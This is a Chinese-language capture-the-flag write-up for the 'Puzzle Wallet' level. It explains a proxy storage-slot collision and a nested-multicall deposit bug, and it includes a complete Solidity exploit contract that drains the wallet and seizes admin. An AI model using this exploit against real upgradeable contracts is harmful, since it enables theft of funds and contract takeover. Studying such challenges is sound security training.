# Level 24: Puzzle Wallet

## 1. 问题

要求攻击 `PuzzleProxy` 合约，成为合约的 admin

<details>
<summary>点击展开原始问题描述</summary>

Nowadays, paying for DeFi operations is impossible, fact.

A group of friends discovered how to slightly decrease the cost of performing multiple transactions by batching them in one transaction, so they developed a smart contract for doing this.

They needed this contract to be upgradeable in case the code contained a bug, and they also wanted to prevent people from outside the group from using it. To do so, they voted and assigned two people with special roles in the system: The admin, which has the power of updating the logic of the smart contract. The owner, which controls the whitelist of addresses allowed to use the contract. The contracts were deployed, and the group was whitelisted. Everyone cheered for their accomplishments against evil miners.

Little did they know, their lunch money was at risk…

You'll need to hijack this wallet to become the admin of the proxy.

Things that might help:

* Understanding how `delegatecall` works and how `msg.sender` and `msg.value` behaves when performing one.
* Knowing about proxy patterns and the way they handle storage variables.
    
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../helpers/UpgradeableProxy-08.sol";

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData)
        UpgradeableProxy(_implementation, _initData)
    {
        admin = _admin;
    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "Caller is not the admin");
        _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted() {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
        require(address(this).balance == 0, "Contract balance is not 0");
        maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
        require(address(this).balance <= maxBalance, "Max balance reached");
        balances[msg.sender] += msg.value;
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success,) = to.call{value: value}(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success,) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}
```
    
</details>

## 2. 解法

整体解法分成2个步骤：

### 2.1. 利用 `逻辑合约` 和 `代理合约` 的 storage 冲突成为 `owner`

`代理合约` (proxy contract) 和 `逻辑合约/实现合约` (implementation contract) 虽然代码逻辑不一样，但是他们在执行的时候，都是修改的代理合约中的 storage. 这个例子，就是 `逻辑合约` 和 `代理合约` 中不同的合约接口使用了同一个 storage slot, 导致的漏洞。

|slot槽位|`PuzzleProxy`合约视角|`PuzzleWallet`合约视角|
|--|--|--|
|0|代表 `pendingAdmin`|代表 `owner`|
|1|代表 `admin`|代表 `maxBalance`|

我们先基于 `PuzzleProxy.proposeNewAdmin` 接口设置一个 `slot[0]` 槽位内的值，相当于修改了 `owner` 地址, 使得我们可以后续可以调用 `PuzzleWallet.addToWhitelist` 把我们的地址加入白名单, 最后通过 `PuzzleWallet.onlyWhitelisted` 校验。

### 2.2. 通过 `multicall` 的漏洞给自己的 `balance` 多记账

> [!CAUTION]
> `delegatecall` 使用当前合约 (caller) 的上下文，包括合约的 `storage`, `msg.sender`, `msg.value` 都不变

`multicall` 内虽然有 `depositCalled` 的校验，但是他只是**局部变量**，如果 `multicall` 递归又调用了一次 `multicall`, 则内层的 `multicall` 仍然可以再调用 `deposit`, 我们利用这个漏洞，达到 __在一笔交易中，调用2次 `deposit` 增加2次 `balances` 的记账，但只付一份的 `msg.value` 原生代币__ 的效果

## 3. 执行步骤

1. 在 `remix` 中编译这个 interface 和对应的hack程序:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface XWalletI {
    function owner() external view returns (address);
    function pendingAdmin() external view returns (address);
    function admin() external view returns (address);
    function maxBalance() external view returns (address);

    function proposeNewAdmin(address _newAdmin) external;
    function setMaxBalance(uint256 _maxBalance) external;
    function addToWhitelist(address addr) external;

    function deposit() external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function multicall(bytes[] calldata data) external payable;
}

contract WalletHack {
    XWalletI wallet;

    constructor(address _wallet) {
        wallet = XWalletI(_wallet);
    }

    function hack() payable public {
        // 相当于将 WalletHack 设置成 PuzzleWallet 的 owner
        wallet.proposeNewAdmin(address(this));
        // 以 owner 身份，讲 WalletHack 加入 whitelist
        wallet.addToWhitelist(address(this));

        // 构造 multicall data, 里面有 2 比交易
        bytes[] memory calls = new bytes[](2);
        // 第一笔交易就是 deposit
        calls[0] = abi.encodeWithSelector(wallet.deposit.selector);
        // 第二笔交易是另一个 multicall data，里面只包含一笔 deposit 交易
        bytes[] memory depositCall = new bytes[](1);
        depositCall[0] = abi.encodeWithSelector(wallet.deposit.selector);
        calls[1] = abi.encodeWithSelector(wallet.multicall.selector, depositCall);
        // 传入的就是 wallet.balance, 这样最终记录的 balances[address(this)] 就是2倍，正好可以全部取出
        uint256 baseBalance = address(wallet).balance;
        require(msg.value >= baseBalance, "insufficient msg.value for multicall");
        wallet.multicall{value: baseBalance}(calls);

        // eth 余额转回给 msg.sender
        wallet.execute(msg.sender, baseBalance * 2, "");

        // 将 msg.sender 转换成 uint256 舍之道 maxBalance, 相当于修改了 `admin`
        wallet.setMaxBalance(uint256(uint160(msg.sender)));
    }
}
```

2. [部署合约](https://sepolia.etherscan.io/tx/0x506cc12cfe188a4389e0c744297cbc45fd30cc939d8db44456bbd8253cb2b578)

3. [执行 `hack` 逻辑](https://sepolia.etherscan.io/tx/0xcdf9bc0b00fdd17621deee2625623e97022d35a4d4dd7d2929ae8965c5fa26ab)

4. [Submit instance](https://sepolia.etherscan.io/tx/0xf10cbe3612a3b225d1c4871a4b3ee91febdf70ea14262e7fb6249de9647fbb81), 通过！

## 4. 本地联调测试

> [!NOTE]
> 这里我们提供一个测试文件 [Level24.t.sol](../../test/level24/Level24_localTest.t.sol)
> 可以在提交之前进行本地调试，调试成功再在测试链上执行

<br/>
<br/>

| [⬅️ level23 Dex Two](../level23_dex_two/README.md) | [level25 Motorbike ➡️](../level25_motorbike/README.md) |
| :----------------------------------------------- | ------------------------------------------: |

